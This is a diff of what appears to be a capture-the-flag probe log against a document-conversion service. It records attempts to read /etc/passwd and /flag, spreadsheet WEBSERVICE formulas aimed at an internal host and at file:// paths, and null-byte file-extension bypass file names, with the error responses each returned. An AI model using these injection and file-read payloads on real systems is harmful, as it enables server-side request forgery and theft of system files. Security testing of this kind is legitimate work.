@@ -1,22 +1,34 @@
 
-=== CONVERT probe.odt /etc/passwd None
-STATUS 200 BYTES 17 RESPONSE ﻿ARENA_MARKER
+=== INFO("release") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 41 RESPONSE cc5614c67e8de6450d98a0e125814305df650b64
 
 
+=== CELL("FILENAME") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 22 RESPONSE 'formula.ods'#$Sheet1
 
-=== CONVERT probe.txt /etc/passwd None
+
+=== WEBSERVICE("http://webapp:8000/") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 7 RESPONSE #NAME?
+
+
+=== WEBSERVICE("http://webapp:8000/flag") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 7 RESPONSE #NAME?
+
+
+=== WEBSERVICE("http://webapp:8000/internal/flag") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 7 RESPONSE #NAME?
+
+
+=== WEBSERVICE("file:///etc/passwd") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 7 RESPONSE #NAME?
+
+
+=== WEBSERVICE("file:///flag") FILENAME_REPR 'formula.ods'
+STATUS 200 BYTES 7 RESPONSE #NAME?
+
+
+=== NUL_EXTENSION_BYPASS FILENAME_REPR 'probe.odt\x00.txt'
 HTTP_ERROR 500 
 
-=== CONVERT probe.txt /etc/passwd {'infilterOptions': 'UpdateDocMode=1'}
-HTTP_ERROR 500 
-
-=== CONVERT probe.txt /etc/passwd {'infilterOptions': '{"UpdateDocMode":{"type":"short","value":"1"}}'}
-HTTP_ERROR 500 
-
-=== CONVERT probe.odt /etc/passwd {'infilterOptions': '{"UpdateDocMode":{"type":"short","value":"1"}}'}
-STATUS 200 BYTES 17 RESPONSE ﻿ARENA_MARKER
-
-
-
-=== CONVERT probe.txt /flag {'infilterOptions': '{"UpdateDocMode":{"type":"short","value":"1"}}'}
+=== NUL_EXTENSION_BYPASS FILENAME_REPR 'probe.odt%00.txt'
 HTTP_ERROR 500 
